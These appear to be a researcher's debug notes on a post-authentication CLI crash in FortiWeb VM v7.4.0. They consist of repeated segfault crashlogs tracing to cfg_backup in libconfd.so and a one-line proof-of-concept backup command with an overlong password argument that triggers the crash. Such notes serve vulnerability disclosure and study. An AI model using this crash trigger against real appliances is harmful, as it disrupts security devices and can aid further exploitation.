;; 
;; FortiWeb VM (v7.4.0 build577) Post-auth CLI Crash
;; 
;; (...)
;; 
;; code610 / some debug notes fyi
;; 
;; 17.11.2023 @ 23:33
;; 

FortiWeb # diagnose debug crashlog show
2023-11-16 05:07:00 <004315> application cli
2023-11-16 05:07:00 <004315> *** signal Segmentation fault received ***
2023-11-16 05:07:00 <004315> RIP     00007fdd1febf44f
2023-11-16 05:07:00 <004315> EFLAGS  0000000000010206
2023-11-16 05:07:00 <004315> RAX     0000000000000000
2023-11-16 05:07:00 <004315> RBX     0000000000000005
2023-11-16 05:07:00 <004315> RCX     00005642dd55d4b1
2023-11-16 05:07:00 <004315> RDX     00007ffca74d8ff0
2023-11-16 05:07:00 <004315> RSI     0000000000000000
2023-11-16 05:07:00 <004315> RDI     00007ffca74d82d0
2023-11-16 05:07:00 <004315> RBP     0000000000000000
2023-11-16 05:07:00 <004315> RSP     00007ffca74d8208
2023-11-16 05:07:00 <004315> CS      0000
2023-11-16 05:07:00 <004315> GS      0000
2023-11-16 05:07:00 <004315> FS      0033
2023-11-16 05:07:00 <004315> Trap    000000000000000e
2023-11-16 05:07:00 <004315> Error   0000000000000006
2023-11-16 05:07:00 <004315> Oldmask 0000000000000000
2023-11-16 05:07:00 <004315> CR2     00007ffca74d9020
2023-11-16 05:07:00 <004315> [0x00007fdd1febf44f] ==> /lib64/libc.so.6 + 0x000000000013d44f)
2023-11-16 05:07:00 <004315> [0x00007fdd21329ae3] => /lib64/libconfd.so (cfg_backup+0x00000193)
2023-11-16 05:07:00 <004315> [0x00007fdd21329ae3] => /lib64/libconfd.so (cfg_backup+0x00000193)
2023-11-16 05:07:38 <004315> application cli
2023-11-16 05:07:38 <004315> *** signal Segmentation fault received ***
2023-11-16 05:07:38 <004315> RIP     00007fdd1fec034f
2023-11-16 05:07:38 <004315> EFLAGS  0000000000010206
2023-11-16 05:07:38 <004315> RAX     0000000000000000
2023-11-16 05:07:38 <004315> RBX     0000000000000006
2023-11-16 05:07:38 <004315> RCX     00005642dd55403b
2023-11-16 05:07:38 <004315> RDX     00007ffca74d8fe0
2023-11-16 05:07:38 <004315> RSI     0000000000000000
2023-11-16 05:07:38 <004315> RDI     00007ffca74d82d0
2023-11-16 05:07:38 <004315> RBP     0000000000000000
2023-11-16 05:07:38 <004315> RSP     00007ffca74d8208
2023-11-16 05:07:38 <004315> CS      0000
2023-11-16 05:07:38 <004315> GS      0000
2023-11-16 05:07:38 <004315> FS      0033
2023-11-16 05:07:38 <004315> Trap    000000000000000e
2023-11-16 05:07:38 <004315> Error   0000000000000006
2023-11-16 05:07:38 <004315> Oldmask 0000000000000000
2023-11-16 05:07:38 <004315> CR2     00007ffca74d9010
2023-11-16 05:07:38 <004315> [0x00007fdd1fec034f] ==> /lib64/libc.so.6 + 0x000000000013e34f)
2023-11-16 05:07:38 <004315> [0x00007fdd21329ae3] => /lib64/libconfd.so (cfg_backup+0x00000193)
2023-11-16 05:07:38 <004315> [0x00007fdd21329ae3] => /lib64/libconfd.so (cfg_backup+0x00000193)
2023-11-16 05:08:00 <004315> application cli
2023-11-16 05:08:00 <004315> *** signal Segmentation fault received ***
2023-11-16 05:08:00 <004315> RIP     00007fdd1febf284
2023-11-16 05:08:00 <004315> EFLAGS  0000000000010246
2023-11-16 05:08:00 <004315> RAX     0000000000000000
2023-11-16 05:08:00 <004315> RBX     0000000000000006
2023-11-16 05:08:00 <004315> RCX     00005642dd558a80
2023-11-16 05:08:00 <004315> RDX     00007ffca74d9030
2023-11-16 05:08:00 <004315> RSI     ffffffffffffffc0
2023-11-16 05:08:00 <004315> RDI     00007ffca74d82d0
2023-11-16 05:08:00 <004315> RBP     0000000000000000
2023-11-16 05:08:00 <004315> RSP     00007ffca74d8208
2023-11-16 05:08:00 <004315> CS      0000
2023-11-16 05:08:00 <004315> GS      0000
2023-11-16 05:08:00 <004315> FS      0033
2023-11-16 05:08:00 <004315> Trap    000000000000000e
2023-11-16 05:08:00 <004315> Error   0000000000000006
2023-11-16 05:08:00 <004315> Oldmask 0000000000000000
2023-11-16 05:08:00 <004315> CR2     00007ffca74d9000
2023-11-16 05:08:00 <004315> [0x00007fdd1febf284] ==> /lib64/libc.so.6 + 0x000000000013d284)
2023-11-16 05:08:00 <004315> [0x00007fdd21329ae3] => /lib64/libconfd.so (cfg_backup+0x00000193)
2023-11-16 05:08:00 <004315> [0x00007fdd21329ae3] => /lib64/libconfd.so (cfg_backup+0x00000193)


FortiWeb # ;; version: FortiWeb VM (v7.4.0 build577) 



;; quick poc:

fgweb_cli> execute backup cli-config tftp SOMEFILENAME 1.1.1.1 PASSWD_LEN_IS_OUR_CRASHER 

;; 
;; https://code610.blogspot.com/search?q=fortigate
;; 
